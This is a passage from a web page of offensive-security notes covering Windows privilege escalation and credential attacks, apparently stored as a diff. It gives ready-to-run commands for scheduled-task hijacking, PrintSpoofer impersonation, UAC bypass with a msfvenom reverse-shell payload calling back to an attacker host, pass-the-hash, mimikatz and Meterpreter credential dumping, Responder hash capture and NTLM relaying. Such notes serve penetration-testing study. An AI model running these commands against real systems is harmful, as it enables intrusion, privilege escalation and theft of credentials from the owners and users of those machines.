+<div class="sourceCode" id="cb24"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a>schtasks <span class="op">/</span>query <span class="op">/</span>fo LIST <span class="op">/</span>v</span></code></pre></div>
+<p>Look for tasks with interesting information in the <code>Task To Run</code>, <code>Run As User</code>, <code>Next Run Time</code>, <code>Author</code> fields.</p></li>
+<li><p>If you find a task running under a <strong>high-privilege user</strong>, check the permissions on the file it executes using <code>icalcs</code>.</p></li>
+<li><p><strong>Replace the executable file</strong> specified in the action of the scheduled task.</p></li>
+<li><p><strong>Wait for the task to run</strong></p></li>
+</ol>
+<hr />
+<h2 id="seimpersonateprivilege">SeImpersonatePrivilege</h2>
+<p><code>SeImpersonatePrivilege</code> is a Windows security privilege that allows a process to impersonate another user or process after authentication.</p>
+<p>This privilege is commonly assigned to services and processes that need to act on behalf of users (for example, IIS). By default, Local System, Network Service, Local Service, and some authenticated services have this privilege.</p>
+<p><strong>To exploit this</strong>:</p>
+<details>
+<summary>
+PrintSpoofer.exe
+</summary>
+<p>This works on <strong>Windows 10</strong> and <strong>Server 2016/2019</strong></p>
+<ol type="1">
+<li><p>Verify privileges:</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a>whoami <span class="op">/</span>priv</span></code></pre></div>
+<p>Look for:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a>Privilege Name                Description                    State</span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="op">============================</span>  <span class="op">=============================</span>  <span class="op">========</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>SeImpersonatePrivilege        Impersonate a client after<span class="op">...</span>  Enabled</span></code></pre></div></li>
+<li><p>Copy the executable of PrintSpoofer.exe from <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer repository</a>.</p></li>
+<li><p>Execute it:</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>\PrintSpoofer64<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>i <span class="op">-</span>c cmd</span></code></pre></div>
+<p>Troubleshooting: https://juggernaut-sec.com/seimpersonateprivilege/#Troubleshooting_PrintSpoofer_Errors Blog post: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges</p>
+</details>
+<blockquote>
+<p><strong>Note</strong>: There are other tools available to accomplish this, such as <strong>Juicy Potato</strong>, <strong>Rogue Potato</strong>, etc.</p>
+</blockquote></li>
+</ol>
+<hr />
+<h2 id="uac-bypass">UAC Bypass</h2>
+<p>User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.</p>
+<p>Prerequisites:</p>
+<ol type="1">
+<li>User must be a member of the Administrators group. <code>net localgroup administrators</code></li>
+<li>Full interactive shell with the victim like meterpreter (a common nc.exe shell is not enough).</li>
+</ol>
+<p><strong>(1) Metasploit</strong></p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">search</span> bypassuac</span></code></pre></div>
+<p><strong>(2) UACME</strong></p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Step</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ps</span></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="ex">migrate</span> <span class="op">&lt;</span>PID explorer.exe<span class="op">&gt;</span></span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Step - Upload Akagi (Akagi64.exe if x64)</span></span>
+<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Step - Create payload with msfvenom</span></span>
+<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a><span class="ex">msfvenom</span> <span class="at">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="op">&lt;</span>IP<span class="op">&gt;</span> LPORT=<span class="op">&lt;</span>PORT<span class="op">&gt;</span> -f exe <span class="at">-o</span> backdoor.exe</span>
+<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Step - Start a listener (exploit/multi/handler)</span></span>
+<span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-12"><a href="#cb29-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Step - Run Akagi</span></span>
+<span id="cb29-13"><a href="#cb29-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Akagi64.exe</span> 23 <span class="op">&lt;</span>payload_full_path<span class="op">&gt;</span> # NOTE FULL PATH</span>
+<span id="cb29-14"><a href="#cb29-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-15"><a href="#cb29-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs</span></span></code></pre></div>
+<hr />
+<h2 id="impersonate-tokens">Impersonate Tokens</h2>
+<p><strong>Metasploit - incognito</strong></p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">load</span> incognito</span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="ex">list_tokens</span> <span class="at">-u</span></span></code></pre></div>
+<div class="sourceCode" id="cb31"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">Delegation</span> Tokens Available</span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a> <span class="ex">========================================</span></span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a> <span class="ex">ANYTHING\Administrator</span></span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a> <span class="ex">NT</span> AUTHORITY<span class="dt">\L</span>OCAL SERVICE</span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a> </span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a> <span class="ex">Impersonation</span> Tokens Available</span>
+<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a> <span class="ex">========================================</span></span>
+<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a> <span class="ex">No</span> tokens available</span></code></pre></div>
+<div class="sourceCode" id="cb32"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">impersonate_token</span> <span class="op">&lt;</span>token_name<span class="op">&gt;</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="co"># E.g. impersonate_token ANYTHING\\Administrator </span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Note: the two backslashes</span></span></code></pre></div>
+<div class="sourceCode" id="cb33"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="co"># You may need to migrate process to a &lt;user&gt; process</span></span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="ex">getpid</span></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a><span class="fu">ps</span>     </span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="co"># PID: 2948 | PPID: 2036 NAME: explorer.exe | ARCH: X64 | SESSION:1 | USER: ANYTHING\Administrator | PATH: C:\Windows\explorer.exe</span></span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Migrate process</span></span>
+<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a><span class="ex">migrate</span> 2948</span></code></pre></div>
+<hr />
+<h2 id="authentication-attacks">Authentication Attacks</h2>
+<h3 id="pass-the-hash">Pass the Hash</h3>
+<p>Pass-the-Hash is a technique where you authenticate as a user without knowing the plaintext password. Instead, you can use the NTLM hash of the password to gain access to systems and resources. This attack works with network protocols that use NTLM authentication, such as <strong>SMB</strong>, <strong>RDP</strong>, and <strong>WinRM</strong>.</p>
+<blockquote>
+<p><strong>Note</strong>: <strong>UAC Remote Restrictions</strong></p>
+<p>By default, User Account Control (UAC) prevents local administrator accounts from performing remote administration tasks.</p>
+<ul>
+<li>Bypass: The built-in <strong>Administrator</strong> account (SID ending in -500) is immune to this restriction.</li>
+<li>Blocked: Any other user in the Administrators group will have their token filtered, and the hash-passing will fail unless UAC remote restrictions are disabled on the target.</li>
+</ul>
+</blockquote>
+<div class="sourceCode" id="cb34"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. with crackmapexec</span></span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="ex">crackmapexec</span> smb <span class="op">&lt;</span>ip<span class="op">&gt;</span> -u <span class="op">&lt;</span>administrator<span class="op">&gt;</span> -H <span class="op">&lt;</span>NTLM hash<span class="op">&gt;</span> -x <span class="st">&quot;ipconfig&quot;</span></span>
+<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. with psexec (impacket)</span></span>
+<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a><span class="ex">impacket-psexec</span> <span class="at">-hashes</span> <span class="op">&lt;</span>LM hash<span class="op">&gt;</span>:<span class="op">&lt;</span>NTLM hash<span class="op">&gt;</span> Administrator@<span class="op">&lt;</span>ip<span class="op">&gt;</span></span>
+<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Method (Metasploit) -&gt; windows/smb/psexec</span></span>
+<span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> use exploit/windows/smb/psexec</span>
+<span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> set RHOSTS <span class="op">&lt;</span>ip<span class="op">&gt;</span></span>
+<span id="cb34-10"><a href="#cb34-10" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> set SMBUser Administrator</span>
+<span id="cb34-11"><a href="#cb34-11" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> set SMBPass <span class="op">&lt;</span>LM hash<span class="op">&gt;</span>:<span class="op">&lt;</span>NTLM hash<span class="op">&gt;</span></span>
+<span id="cb34-12"><a href="#cb34-12" aria-hidden="true" tabindex="-1"></a><span class="ex">msf</span> <span class="op">&gt;</span> run</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong></p>
+<ul>
+<li>Empty LM hash: <code>AAD3B435B51404EEAAD3B435B51404EE</code> (means its non-use).
+<ul>
+<li><code>AAD3B435B51404EEAAD3B435B51404EE:&lt;NTLM&gt;</code></li>
+</ul></li>
+<li>With <code>hashdump</code> you have the right format</li>
+</ul>
+</blockquote>
+<hr />
+<h3 id="dumping-credentials-from-memory-sam">Dumping Credentials from Memory &amp; SAM</h3>
+<p><strong>Prerequisites</strong>: User must be a member a local Administrators.</p>
+<p><strong>(1) hashdump (Metasploit - Meterpreter)</strong></p>
+<div class="sourceCode" id="cb35"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="co"># You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process</span></span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> getpid</span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> ps <span class="co"># Find a SYSTEM process like lsass.exe or winlogon.exe</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> migrate <span class="op">&lt;</span>PID<span class="op">&gt;</span></span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Dump the hashes</span></span>
+<span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> hashdump</span></code></pre></div>
+<p><strong>(2) Kiwi (Metasploit - Meterpreter)</strong></p>
+<div class="sourceCode" id="cb36"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Ensure you are running as SYSTEM</span></span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> getuid</span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> getsystem <span class="co"># if needed</span></span>
+<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Load the kiwi extension</span></span>
+<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> load kiwi</span>
+<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Retrieve all available credentials (plaintext, hashes, tickets, etc.)</span></span>
+<span id="cb36-9"><a href="#cb36-9" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> creds_all</span>
+<span id="cb36-10"><a href="#cb36-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb36-11"><a href="#cb36-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Dump NTLM hashes for all of the user accounts on the system</span></span>
+<span id="cb36-12"><a href="#cb36-12" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> lsa_dump_sam</span>
+<span id="cb36-13"><a href="#cb36-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb36-14"><a href="#cb36-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Dump plaintext passwords and other secrets from memory (LSASS)</span></span>
+<span id="cb36-15"><a href="#cb36-15" aria-hidden="true" tabindex="-1"></a><span class="ex">lsa_dump_secrets</span></span>
+<span id="cb36-16"><a href="#cb36-16" aria-hidden="true" tabindex="-1"></a><span class="co"># Note: from the Windows version 8.0+, windows don’t store any plain text password.</span></span>
+<span id="cb36-17"><a href="#cb36-17" aria-hidden="true" tabindex="-1"></a><span class="co"># So, it can be helpful for the older version of the Windows.</span></span></code></pre></div>
+<p><strong>(3) Mimikatz</strong></p>
+<p>The most powerful credential-dumping tool.</p>
+<ol type="1">
+<li><p><strong>Upload and execute</strong> <code>mimikatz.exe</code> on the target machine</p></li>
+<li><p><strong>Enable Debug Privileges</strong>. This should be a standard for running mimikatz as it <code>SeDebugPrivilege</code> access right enabled to run command such as <code>sekurlsa::logonpasswords</code> and <code>lsadump::sam</code>.</p>
+<pre class="dos"><code>mimikatz # privilege::debug
+Privilege &#39;20&#39; OK</code></pre>
+<p>This should return <strong>Privilege ‘20’ OK</strong>.</p></li>
+<li><p><strong>Extract Logon Passwords</strong>. This command parses the LSASS process memory for credentials of logged-on users.</p>
+<pre class="dos"><code>sekurlsa::logonpasswords</code></pre></li>
+<li><p><strong>Dump NTLM hashes</strong> from the SAM. You must first run <code>token::elevate</code> to elevate to <code>SYSTEM</code> user privileges.</p>
+<pre class="dos"><code>mimikatz # token::elevate
+mimikatz # lsadump::sam</code></pre></li>
+</ol>
+<hr />
+<h3 id="abuse-the-net-ntlmv2">Abuse the Net-NTLMv2</h3>
+<p>If you cannot dump hashes directly, you can capture a <strong>Net-NTLMv2</strong> hash. This is a challenge-response hash used for network authentication and is more secure than NTLMv1. Unlike an NTLM hash, it cannot be used for Pass-the-Hash but can be cracked offline or relayed.</p>
+<ol type="1">
+<li><p><strong>Set up a fake SMB/HTTP server</strong> using <strong><a href="https://github.com/lgandx/Responder">Responder</a></strong> or similar tool.</p>
+<div class="sourceCode" id="cb40"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="co"># sudo responder -I &lt;your_network_interface&gt; -v</span></span>
+<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> responder <span class="at">-I</span> tap0 <span class="at">-v</span></span></code></pre></div></li>
+<li><p><strong>Trigger Authentication</strong>. Force a Windows machine to authenticate to your listener.</p>
+<ul>
+<li><strong>From a Shell</strong>: If you have command execution, request a resource from your attacker machine’s fake share.</li>
+</ul>
+<div class="sourceCode" id="cb41"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="fu">dir</span> <span class="dt">\\</span><span class="op">&lt;</span>your_ip<span class="op">&gt;</span><span class="dt">\s</span>hare</span></code></pre></div>
+<ul>
+<li><strong>From a Web App</strong>: If there’s a feature that processes UNC paths (e.g., file upload, avatar from URL), provide a path to your listener.</li>
+</ul>
+<div class="sourceCode" id="cb42"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="ex">\\</span><span class="op">&lt;</span>your_ip<span class="op">&gt;</span><span class="dt">\s</span>hare\nonexistent.pdf</span></code></pre></div></li>
+<li><p><strong>Capture the Hash</strong>: Responder will capture the challenge-response exchange. The hash will look something like this:</p>
+<div class="sourceCode" id="cb43"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[SMB]</span> NTLMv2-SSP Hash Captured: user::domain:challenge:response_hash</span></code></pre></div></li>
+<li><p><strong>Crack the Hash</strong>: Use a tool like Hashcat with mode 5600 to crack the captured hash offline.</p>
+<div class="sourceCode" id="cb44"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hashcat</span> <span class="at">-m</span> 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt</span></code></pre></div></li>
+</ol>
+<hr />
+<h3 id="relaying-net-ntlmv2">Relaying Net-NTLMv2</h3>
+<p>This technique is used when you have captured a user’s Net-NTLMv2 hash but cannot crack it. The core idea is to forward this hash to another machine for authentication, hoping the user has administrative privileges on that target machine.</p>
+<p><strong>Requirement</strong>: The success of this attack against a user who is not the default local Administrator depends on UAC Remote Restrictions being disabled on the target machine.</p>
+<ol type="1">
+<li><p><strong>Setup (on Attacker Machine)</strong>: Use <code>impacket-ntlmrelayx</code> to listen for a connection and relay it to the target, executing a command upon success.</p>
+<div class="sourceCode" id="cb45"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="ex">impacket-ntlmrelayx</span> <span class="at">-t</span> <span class="pp">[</span><span class="ss">Target_2_IP</span><span class="pp">]</span> <span class="at">-c</span> <span class="st">&quot;[Command_to_Execute]&quot;</span> <span class="at">-smb2support</span></span></code></pre></div></li>
+<li><p>Trigger (on Source Machine: TARGET_1)</p>
+<div class="sourceCode" id="cb46"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="dt">\\</span><span class="op">&lt;</span>your_ip<span class="op">&gt;</span><span class="dt">\s</span>hare</span></code></pre></div></li>
+<li><p>Relay (by Attacker Machine)</p>
+<p>The <code>ntlmrelayx</code> tool intercepts the authentication attempt from TARGET_1. It does not authenticate it. Instead, it forwards (relays) the hash to the specified target, TARGET_2.</p></li>
+<li><p>Execution (on Target Machine: TARGET_2)</p>
+<p>TARGET_2 receives the relayed authentication request and validates the TARGET_2_admin hash.</p>
+<p><strong>IF</strong> TARGET_2_admin is a local administrator <strong>AND</strong> UAC remote restrictions are disabled, the authentication succeeds. TARGET_2 then executes the payload supplied by <code>ntlmrelayx</code> in Step 1.</p></li>
+</ol>
+<hr />
+<h2 id="other">Other</h2>
+<ul>
+<li>Saved Windows Credentials
+<ul>
+<li>cmdkey /list</li>
+<li>runas /savecred /user:admin cmd.exe</li>
+</ul></li>
+<li>Scheduled Tasks</li>
+<li>Insecure Permissions on Service Executable</li>
+<li>Insecure Service Permissions</li>
+<li>Windows Privileges</li>
+<li>Unpatched Software</li>
+</ul>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
